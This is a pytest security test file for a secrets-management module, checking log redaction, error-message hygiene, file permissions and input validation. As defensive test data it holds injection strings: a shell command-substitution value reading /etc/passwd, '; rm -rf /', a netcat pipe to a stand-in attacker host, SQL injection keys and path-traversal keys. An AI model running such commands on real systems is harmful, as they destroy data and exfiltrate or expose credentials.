# SPDX-License-Identifier: Apache-2.0
# Copyright 2024-2026 Joseph Webber <joseph.webber@me.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Security-specific tests for secrets management module.

Tests cover:
- Secrets never logged
- Error messages don't leak secrets
- Memory handling (best effort)
- Input validation
"""

import logging
import os
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

from agentic_brain.secrets import (
    BotSecrets,
    DotEnvBackend,
    EnvVarBackend,
    SecretNotFoundError,
    SecretsBackendError,
    SecretsManager,
)


class TestSecretsNotLogged:
    """Verify secrets are never included in log messages."""

    @pytest.fixture(autouse=True)
    def cleanup_env(self) -> None:
        """Clean up test environment variables after each test."""
        yield
        to_remove = [k for k in os.environ if k.startswith("TEST_SEC_")]
        for key in to_remove:
            del os.environ[key]

    @pytest.mark.asyncio
    async def test_get_secret_doesnt_log_value(self, caplog):
        """Getting a secret should not log its value."""
        backend = EnvVarBackend(prefix="TEST_SEC_")
        secret_value = "super-secret-password-12345"

        await backend.set_secret("API_KEY", secret_value)

        with caplog.at_level(logging.DEBUG):
            value = await backend.get_secret("API_KEY")

        assert value == secret_value
        # Secret should not be in logs
        assert secret_value not in caplog.text
        # Key name is okay to log
        # (implementation may or may not log it)

    @pytest.mark.asyncio
    async def test_set_secret_doesnt_log_value(self, caplog):
        """Setting a secret should not log its value."""
        backend = EnvVarBackend(prefix="TEST_SEC_")
        secret_value = "another-secret-value-67890"

        with caplog.at_level(logging.DEBUG):
            await backend.set_secret("DB_PASSWORD", secret_value)

        # Secret should not be in logs
        assert secret_value not in caplog.text

    @pytest.mark.asyncio
    async def test_error_messages_dont_leak_secrets(self):
        """Error messages should not contain secret values."""
        backend = EnvVarBackend(prefix="TEST_SEC_")
        secret_value = "leaked-secret-value"

        await backend.set_secret("MY_SECRET", secret_value)
        await backend.delete_secret("MY_SECRET")

        # Try to get deleted secret
        with pytest.raises(SecretNotFoundError) as exc_info:
            await backend.get_secret("MY_SECRET")

        error_message = str(exc_info.value)
        # Error should NOT contain the secret value
        assert secret_value not in error_message


class TestSecretsInputValidation:
    """Test input validation for secrets operations."""

    @pytest.fixture(autouse=True)
    def cleanup_env(self) -> None:
        """Clean up test environment variables."""
        yield
        to_remove = [k for k in os.environ if k.startswith("TEST_VALID_")]
        for key in to_remove:
            del os.environ[key]

    @pytest.mark.asyncio
    async def test_empty_key_handled(self):
        """Empty key should be handled gracefully."""
        backend = EnvVarBackend(prefix="TEST_VALID_")

        # Setting with empty key
        with pytest.raises((SecretNotFoundError, KeyError, ValueError)):
            await backend.get_secret("")

    @pytest.mark.asyncio
    async def test_key_normalization(self):
        """Keys should be normalized consistently."""
        backend = EnvVarBackend(prefix="TEST_VALID_")

        await backend.set_secret("my_key", "value1")

        # Should find with different cases
        assert await backend.get_secret("MY_KEY") == "value1"
        assert await backend.get_secret("my_key") == "value1"

    @pytest.mark.asyncio
    async def test_special_characters_in_values(self):
        """Secret values with special characters should be handled."""
        backend = EnvVarBackend(prefix="TEST_VALID_")

        special_values = [
            "pass=word",  # Equals sign
            "pass word",  # Space
            "pass\nword",  # Newline
            'pass"word',  # Quote
            "pass'word",  # Single quote
            "pass$word",  # Dollar sign
            "日本語",  # Unicode
        ]

        for i, value in enumerate(special_values):
            key = f"SPECIAL_{i}"
            await backend.set_secret(key, value)
            retrieved = await backend.get_secret(key)
            assert retrieved == value, f"Failed for value: {repr(value)}"


class TestDotEnvSecurity:
    """Security tests for .env file backend."""

    @pytest.fixture
    def temp_env_file(self) -> Path:
        """Create a temporary .env file."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".env", delete=False) as f:
            f.write("# Test env file\n")
            f.write("SECRET_KEY=test_secret_value\n")
            return Path(f.name)

    @pytest.mark.asyncio
    async def test_readonly_prevents_writes(self, temp_env_file):
        """Readonly backend should prevent secret modification."""
        backend = DotEnvBackend(env_path=temp_env_file, readonly=True)

        with pytest.raises(SecretsBackendError):
            await backend.set_secret("NEW_KEY", "new_value")

    @pytest.mark.asyncio
    async def test_file_permissions_preserved(self, temp_env_file):
        """File permissions should be preserved on write."""
        # Set restrictive permissions
        temp_env_file.chmod(0o600)

        backend = DotEnvBackend(env_path=temp_env_file, readonly=False)
        await backend.set_secret("ADDED_KEY", "added_value")

        # Check permissions are still restrictive
        mode = temp_env_file.stat().st_mode & 0o777
        assert mode == 0o600, f"Permissions changed to {oct(mode)}"

    @pytest.mark.asyncio
    async def test_no_command_injection_in_values(self, temp_env_file):
        """Values that look like shell commands should be stored safely."""
        backend = DotEnvBackend(env_path=temp_env_file, readonly=False)

        dangerous_values = [
            "$(whoami)",
            "`cat /etc/passwd`",
            "; rm -rf /",
            "| nc attacker.com 1234",
        ]

        for i, value in enumerate(dangerous_values):
            key = f"DANGEROUS_{i}"
            await backend.set_secret(key, value)
            retrieved = await backend.get_secret(key)
            # Value should be stored exactly as-is, not executed
            assert retrieved == value


class TestMemoryHandling:
    """Test memory handling for secrets (best effort)."""

    def test_sanitize_log_creates_safe_message(self):
        """Log sanitization should not include secret values."""
        from agentic_brain.secrets.manager import _sanitize_log_message

        secret = "super-secret-password"
        message = _sanitize_log_message("API_KEY", secret)

        # Message should not contain the secret
        assert secret not in message
        # But should indicate a value exists
        assert "present" in message or str(len(secret)) in message

    def test_sanitize_log_handles_none(self):
        """Log sanitization should handle None values."""
        from agentic_brain.secrets.manager import _sanitize_log_message

        message = _sanitize_log_message("MISSING_KEY", None)

        assert "not present" in message or "None" not in message


class TestSecretsManagerFallback:
    """Test SecretsManager fallback chain security."""

    @pytest.fixture(autouse=True)
    def cleanup_env(self) -> None:
        """Clean up test environment variables."""
        yield
        to_remove = [k for k in os.environ if k.startswith("AGENTIC_BRAIN_")]
        for key in to_remove:
            del os.environ[key]

    @pytest.mark.asyncio
    async def test_fallback_doesnt_expose_which_backend(self):
        """Error messages shouldn't reveal backend details to attackers."""
        manager = SecretsManager(backends=[EnvVarBackend()])

        with pytest.raises(SecretNotFoundError) as exc_info:
            await manager.require("NONEXISTENT_SECRET")

        error_message = str(exc_info.value)
        # Should be a generic message
        assert "not found" in error_message.lower()
        # Should not reveal specific backend info
        # (This is subjective - the key goal is no secret leakage)

    @pytest.mark.asyncio
    async def test_get_returns_none_not_error_details(self):
        """get() should return None, not error details."""
        manager = SecretsManager(backends=[EnvVarBackend()])

        result = await manager.get("NONEXISTENT_SECRET")

        assert result is None


class TestBotSecretsLegacy:
    """Test legacy BotSecrets class security."""

    @pytest.fixture(autouse=True)
    def cleanup_env(self) -> None:
        """Clean up test environment variables."""
        yield
        to_remove = [k for k in os.environ if k.startswith("AGENTIC_BRAIN_")]
        for key in to_remove:
            del os.environ[key]

    def test_get_returns_none_for_missing(self):
        """BotSecrets.get() should return None/default for missing secrets."""
        secrets = BotSecrets()

        result = secrets.get("DEFINITELY_NOT_SET")
        assert result is None

        result_with_default = secrets.get("DEFINITELY_NOT_SET", "default_value")
        assert result_with_default == "default_value"

    def test_set_stores_in_env_when_keyring_unavailable(self):
        """BotSecrets.set() should fall back to env vars safely."""
        secrets = BotSecrets()
        # Patch instance attribute
        secrets._keyring_available = False

        result = secrets.set("TEST_KEY", "test_value")
        assert result is True

        # Verify it's in environment
        assert os.environ.get("AGENTIC_BRAIN_TEST_KEY") == "test_value"


class TestInjectionPrevention:
    """Test prevention of injection attacks through secrets."""

    @pytest.fixture(autouse=True)
    def cleanup_env(self) -> None:
        """Clean up test environment variables."""
        yield
        to_remove = [k for k in os.environ if k.startswith("TEST_INJ_")]
        for key in to_remove:
            del os.environ[key]

    @pytest.mark.asyncio
    async def test_sql_injection_in_secret_name(self):
        """SQL-like injection in key names should be handled safely."""
        backend = EnvVarBackend(prefix="TEST_INJ_")

        # These should not cause issues
        suspicious_keys = [
            "'; DROP TABLE secrets;--",
            "key OR 1=1",
            "key UNION SELECT * FROM users",
        ]

        for key in suspicious_keys:
            # Should either work as literal key or raise validation error
            # Should NOT execute any SQL-like commands
            try:
                await backend.set_secret(key, "value")
                # If set succeeds, get should return the value
                retrieved = await backend.get_secret(key)
                assert retrieved == "value"
            except (ValueError, KeyError):
                # Some backends may reject special characters - that's fine
                pass

    @pytest.mark.asyncio
    async def test_path_traversal_in_key(self):
        """Path traversal attempts in key names should be blocked."""
        # For file-based backends, path traversal could be dangerous
        with tempfile.TemporaryDirectory() as tmpdir:
            env_path = Path(tmpdir) / ".env"
            env_path.write_text("EXISTING=value\n")

            backend = DotEnvBackend(env_path=env_path)

            # These should not escape the env file
            traversal_keys = [
                "../../../etc/passwd",
                "..\\..\\windows\\system32",
                "/etc/passwd",
            ]

            for key in traversal_keys:
                # Key gets normalized - should be safe
                try:
                    await backend.set_secret(key, "value")
                except (ValueError, SecretsBackendError):
                    pass  # Rejection is acceptable

            # Original file should not be corrupted
            content = env_path.read_text()
            assert "EXISTING=value" in content
